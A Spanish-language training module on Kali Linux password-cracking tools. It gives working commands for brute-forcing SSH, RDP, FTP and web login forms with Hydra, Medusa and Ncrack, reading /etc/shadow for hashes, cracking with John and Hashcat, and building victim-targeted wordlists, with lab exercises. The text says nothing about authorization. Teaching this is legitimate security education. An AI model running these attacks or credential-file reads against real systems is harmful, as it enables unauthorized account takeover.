![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **MÓDULO DE APRENDIZAJE: KALI-TOOLS-PASSWORDS - ATAQUES DE DESCIFRADO DE CONTRASEÑAS (FUERZA BRUTA EN LÍNEA Y FUERA DE LÍNEA)**

## **1. INTRODUCCIÓN AL METAPAQUETE `kali-tools-passwords`**

Kali Linux agrupa herramientas en metapaquetes según su función. **`kali-tools-passwords`** está diseñado específicamente para realizar **ataques de fuerza bruta y descifrado de contraseñas**, tanto en línea como fuera de línea.

### **1.1 Objetivos del Metapaquete**

El metapaquete **`kali-tools-passwords`** incluye herramientas para:

✅ Realizar ataques de **fuerza bruta en línea** a servicios como SSH, RDP, FTP, HTTP, MySQL, etc.

✅ Descifrar contraseñas **fuera de línea** utilizando ataques basados en diccionarios o fuerza bruta.

✅ **Analizar y romper hashes** de contraseñas almacenadas en bases de datos o archivos de sistemas.

✅ **Generar listas de contraseñas personalizadas** para mejorar la efectividad de los ataques.

### **1.2 Instalación del Metapaquete**

Para instalar todas las herramientas incluidas en `kali-tools-passwords`, ejecuta:

```less
sudo apt update
sudo apt install kali-tools-passwords -y
```

🔗 **Referencia oficial:**
https://www.kali.org/tools/kali-tools-passwords/

------

## **2. HERRAMIENTAS INCLUIDAS EN `kali-tools-passwords` Y SU USO PRÁCTICO**

A continuación, exploraremos las herramientas más importantes del metapaquete junto con ejemplos prácticos.

------

### **2.1 Ataques de Fuerza Bruta en Línea (Online)**

Estas herramientas permiten probar múltiples combinaciones de usuario y contraseña en servicios remotos.

#### **2.1.1 Hydra - Ataques de Fuerza Bruta a Servicios Remotos**

Hydra es una de las herramientas más potentes para ataques en línea contra SSH, FTP, HTTP, MySQL, y más.

```bash
hydra -L usuarios.txt -P passwords.txt 192.168.1.100 ssh
```

🔹 **Explicación:** Ataca el servicio SSH de la IP `192.168.1.100` probando combinaciones de usuario y contraseña.

Ejemplo para HTTP con formulario de inicio de sesión:

```bash
hydra -L usuarios.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"
```

#### **2.1.2 Medusa - Alternativa a Hydra**

Medusa es otra herramienta de fuerza bruta eficiente y modular.

```bash
medusa -h 192.168.1.100 -U usuarios.txt -P passwords.txt -M ssh
```

🔹 **Explicación:** Ataca un servidor SSH usando la lista de usuarios y contraseñas.

#### **2.1.3 Ncrack - Ataques de Alta Velocidad a Servicios Remotos**

Ncrack es útil para atacar múltiples protocolos simultáneamente.

```bash
ncrack -p 22,21,3389 -U usuarios.txt -P passwords.txt 192.168.1.100
```

🔹 **Explicación:** Ataca SSH (22), FTP (21) y RDP (3389) en un servidor.

### **2.2 Descifrado de Contraseñas en Archivos (Offline)**

Estas herramientas permiten descifrar hashes de contraseñas obtenidos de bases de datos o archivos.

#### **2.2.1 John The Ripper - Descifrado de Hashes**

John The Ripper es una herramienta poderosa para descifrar hashes de contraseñas.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

🔹 **Explicación:** Usa `rockyou.txt` como diccionario para descifrar los hashes almacenados en `hashes.txt`.

Para obtener los hashes de usuarios en Linux:

```bash
sudo cat /etc/shadow | awk -F: '{print $1, $2}'
```

#### **2.2.2 Hashcat - Descifrado con GPU**

Hashcat permite descifrar contraseñas utilizando el poder de la GPU.

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

🔹 **Explicación:** Descifra hashes de tipo `MD5` (`-m 0`) usando un ataque de diccionario (`-a 0`).

Ejemplo de ataque de fuerza bruta a contraseñas de 6 caracteres:

```bash
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l
```

🔹 **Explicación:** Prueba todas las combinaciones de letras minúsculas (`?l`) de 6 caracteres.

------

### **2.3 Generación de Listas de Contraseñas**

Es útil generar listas de contraseñas personalizadas basadas en información de la víctima.

#### **2.3.1 Crunch - Generador de Diccionarios de Contraseñas**

```bash
crunch 8 8 abcdef123 > diccionario.txt
```

🔹 **Explicación:** Genera todas las combinaciones posibles de 8 caracteres usando `abcdef123`.

Ejemplo avanzado:

```bash
crunch 6 10 -t @@@@%% -o custom_list.txt
```

🔹 **Explicación:** Genera contraseñas de 6 a 10 caracteres donde `@` representa letras y `%` representa números.

#### **2.3.2 CeWL - Creación de Diccionarios Personalizados desde Sitios Web**

```bash
cewl -w cewl_list.txt -d 3 http://objetivo.com
```

🔹 **Explicación:** Extrae palabras clave de `objetivo.com` para crear una lista de contraseñas personalizadas.

------

## **3. PRÁCTICAS Y EJERCICIOS**

A continuación, ejercicios prácticos para reforzar el aprendizaje.

### **3.1 Ejercicio 1: Fuerza Bruta a SSH con Hydra**

1. Ejecutar un ataque de fuerza bruta contra un servidor SSH:

   ```bash
   hydra -L usuarios.txt -P passwords.txt 192.168.1.100 ssh
   ```

2. Analizar los resultados e identificar credenciales correctas.

------

### **3.2 Ejercicio 2: Descifrado de Hashes con John The Ripper**

1. Extraer hashes de un sistema Linux:

   ```bash
   sudo cat /etc/shadow > hashes.txt
   ```

2. Ejecutar John The Ripper:

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

3. Identificar contraseñas recuperadas.

------

### **3.3 Ejercicio 3: Generación de Listas de Contraseñas con Crunch**

1. Generar una lista de contraseñas de 8 caracteres con letras y números:

   ```bash
   crunch 8 8 abcdef123 > diccionario.txt
   ```

2. Usar esta lista con Hydra para intentar un ataque.

------

## **4. PROYECTO FINAL: ANÁLISIS DE SEGURIDAD DE CONTRASEÑAS**

**Objetivo:** Auditar y romper contraseñas de un sistema simulado.

### **4.1 Configurar un Servidor SSH Vulnerable**

```bash
sudo apt install openssh-server -y
sudo systemctl start ssh
```

🔹 Configurar un usuario con contraseña débil.

### **4.2 Ataques a Realizar**

1. Escaneo del puerto SSH con Nmap.
2. Ataque de fuerza bruta con Hydra.
3. Descifrado de hashes con Hashcat.

------

## **5. CONCLUSIÓN Y SIGUIENTES PASOS**

Este módulo cubre herramientas de **descifrado de contraseñas** incluidas en `kali-tools-passwords`, aplicables tanto a ataques en línea como fuera de línea.

🔹 **Siguientes pasos:**

- Explorar ataques a credenciales en bases de datos con SQLmap.
- Realizar análisis de políticas de contraseñas en empresas.
- Aprender sobre **doble factor de autenticación (2FA)** para fortalecer la seguridad.

📌 **Recursos adicionales:**

- **Rockyou.txt:** https://github.com/brannondorsey/naive-hashcat/releases



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)